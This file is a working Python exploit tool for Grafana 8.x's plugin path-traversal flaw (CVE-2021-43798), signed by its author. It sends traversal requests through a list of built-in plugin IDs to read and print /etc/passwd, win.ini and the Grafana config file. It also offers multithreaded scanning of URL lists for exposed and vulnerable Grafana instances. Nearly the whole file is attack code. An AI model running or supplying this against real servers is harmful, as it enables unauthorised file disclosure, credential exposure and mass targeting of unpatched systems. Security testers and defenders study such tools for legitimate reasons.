#!/bin/python3

import re
import argparse
import httplib2
import requests
from rich.console import Console
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

def ascii_art():
    color.print("""[bold cyan]
  ______     _______     ____   ___ ____  _       _  _  __________ ___   ___
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ /___  / _ \ ( _ )
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \  / / (_) |/ _ \\
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) |/ / \__, | (_) |
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____//_/    /_/ \___/
    [/bold cyan]""")
    print("Coded By: K3ysTr0K3R")
    print("")

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2483.181 Mobile Safari/537.36'
}

vulnerable_versions = [
    '8.0.0-beta1', '8.0.1', '8.0.2', '8.0.3', '8.0.4', '8.0.5', '8.0.6', '8.0.7',
    '8.1.0', '8.1.1', '8.1.2', '8.1.3', '8.1.4', '8.1.5', '8.1.6', '8.1.7', '8.1.8',
    '8.2.0', '8.2.1', '8.2.2', '8.2.3', '8.2.4', '8.2.5', '8.2.6', '8.2.7',
    '8.3.0', '8.3.1'
]

plugin_ids = [
    "alertlist", "annolist", "barchart", "bargauge", "candlestick", "cloudwatch", 
    "dashlist", "elasticsearch", "gauge", "geomap", "gettingstarted", 
    "grafana-azure-monitor-datasource", "graph", "heatmap", "histogram", "influxdb", 
    "jaeger", "logs", "loki", "mssql", "mysql", "news", "nodeGraph", "opentsdb", 
    "piechart", "pluginlist", "postgres", "prometheus", "stackdriver", "stat", 
    "state-timeline", "status-history", "table", "table-old", "tempo", "testdata", 
    "text", "timeseries", "welcome", "zipkin"
]

paths = [
    '/public/plugins/{plugin_id}/../../../../../../../../../../../../../../../../../../../etc/passwd',
    '/public/plugins/{plugin_id}/../../../../../../../../../../../../../../../../../../../windows/win.ini',
    '/public/plugins/{plugin_id}/../../../../../conf/defaults.ini'
]

regexes = [
    re.compile(r'root:.*:0:([0-9]+):'),
    re.compile(r'/tmp/grafana\.sock'),
    re.compile(r'\[(fonts|extensions|Mail|files)\]')
]

detection_rules = [
    {"name": "grafana", "words": ["Grafana", "login"], "condition": "and"},
    {"name": "grafana", "words": ["window.grafanabootdata = "], "condition": "or"},
    {"name": "grafana", "words": ["grafana-app"], "condition": "or"}
]

color = Console()

def fetch_element(target):
    try:
        response = requests.get(target, timeout=5, headers=headers)
        return response.text
    except requests.RequestException:
        return ""

def detect_vuln(target):
    detected_versions = []
    response = requests.get(target, timeout=5, headers=headers).text
    pattern = re.findall(r'(?<="subTitle":"Grafana v)\d{1,2}\.\d{1,2}\.\d{1,2}(?:(?:-beta\d)?|(?:-preview)?)', response)
    check = [version for version in pattern if version in vulnerable_versions]
    stripped_versions = [re.sub(r'[\[\]]', '', version) for version in check]
    for detect_version in stripped_versions:
        detected_versions.append(detect_version)
    return detected_versions

def detect_grafana(target):
    content = fetch_element(target)
    results = {"url": target, "detected": False, "details": []}
    for rule in detection_rules:
        if rule["condition"] == "and":
            if all(word in content for word in rule["words"]):
                results["detected"] = True
                results["details"].append({"name": rule["name"], "match": rule["words"]})
        else:
            found_words = [word for word in rule["words"] if word in content]
            if found_words:
                results["detected"] = True
                results["details"].append({"name": rule["name"], "match": found_words})
    return results

def extract_passwd(target):
    detected_versions = detect_vuln(target)
    if detected_versions:
        for detect_version in detected_versions:
            color.print(f"[bold bright_green][+][/bold bright_green] Detected vulnerable version: [bold bright_yellow]{detect_version}[/bold bright_yellow]")
    else:
        color.print("[red][~][/red] Vulnerable version could not be determined")
        color.print("[bold bright_blue][*][/bold bright_blue] Proceeding just to make sure")
    found_vulnerable = False
    color.print("[bold bright_blue][*][/bold bright_blue] Shifting through plugin ids")
    for plugin_id in plugin_ids:
        color.print(f"[bold bright_blue][*][/bold bright_blue] Trying plugin id: [bold cyan]{plugin_id}[/bold cyan]")
        for path in paths:
            formatted_path = path.format(plugin_id=plugin_id)
            url = target + formatted_path
            http = httplib2.Http()
            try:
                response, content = http.request(url, 'GET')
                content_str = content.decode('utf-8')
                vulnerable = any(regex.search(content_str) for regex in regexes)
                if vulnerable:
                    color.print(f"[bold bright_green][+][/bold bright_green] Vulnerable entry found at plugin: [bold cyan]{plugin_id}[/bold cyan]")
                    color.print("[bold bright_green][+][/bold bright_green] Dumping data please wait")
                    print(content_str)
                    found_vulnerable = True
                    break
            except Exception:
                continue
        if found_vulnerable:
            break
    if not found_vulnerable:
        color.print("[bold red][~][/bold red] The target does not appear to be vulnerable")

def stabilise_detection(target):
    try:
        detection_result = detect_grafana(target)
        if detection_result["detected"]:
            color.print(f"[bold bright_green][+][/bold bright_green] Grafana detected on [bold bright_yellow]{target}[/bold bright_yellow]")
    except Exception:
        pass

def stabilise_vuln_detection(target):
    detected_versions = detect_vuln(target)
    if detected_versions:
        for detect_version in detected_versions:
            color.print(f"[bold bright_green][+][/bold bright_green] Detected vulnerability at [bold bright_yellow]{target}[/bold bright_yellow]")

def scan_file_for_grafana(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file]
        if not urls:
            return

        completed_tasks = []
        failed_tasks = []

        with alive_bar(
            len(urls), title="Scanning Targets", bar="smooth", enrich_print=False
        ) as bar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_url = {
                    executor.submit(stabilise_detection, url): url for url in urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        completed_tasks.append(url)
                    except Exception:
                        failed_tasks.append((url))
                    bar()

def scan_file_for_vuln(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file]
        if not urls:
            return

        completed_tasks = []
        failed_tasks = []

        with alive_bar(
            len(urls), title="Scanning Targets", bar="smooth", enrich_print=False
        ) as bar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_url = {
                    executor.submit(stabilise_vuln_detection, url): url for url in urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        completed_tasks.append(url)
                    except Exception:
                        failed_tasks.append((url))
                    bar()

def main():
    ascii_art()
    parser = argparse.ArgumentParser(description='Grafana Vulnerability and Detection Tool')
    parser.add_argument('-u', '--url', required=False, help='Target URL to exploit')
    parser.add_argument('-t', '--threads', required=False, help='Add the amount of threads to your needs')
    parser.add_argument('--detect-vuln', required=False, help='Detect Grafana from a file containing URLs')
    parser.add_argument('--detect-grafana', required=False, help='Detect Grafana vuln from a file containing URLs')
    args = parser.parse_args()

    if args.url:
        color.print(f"[bold bright_blue][*][/bold bright_blue] Detecting Grafana instance")
        detection_result = detect_grafana(args.url)
        if detection_result["detected"]:
            color.print(f"[bold bright_green][+][/bold bright_green] Grafana detected on [bold bright_yellow]{args.url}[/bold bright_yellow]")
            color.print("[bold bright_blue][*][/bold bright_blue] Proceeding with vulnerability check")
            extract_passwd(args.url)
        else:
            color.print("[bold red][-][/bold red] Grafana not detected")
            exit()

    elif args.detect_grafana:
        color.print(f"[bold bright_blue][*][/bold bright_blue] Detecting Grafana instance")
        scan_file_for_grafana(args.detect_grafana, int(args.threads or 1))

    elif args.detect_vuln:
        color.print(f"[bold bright_blue][*][/bold bright_blue] Detecting vulnerabilities in Grafana instances")
        scan_file_for_vuln(args.detect_vuln, int(args.threads or 1))

if __name__ == '__main__':
    main()
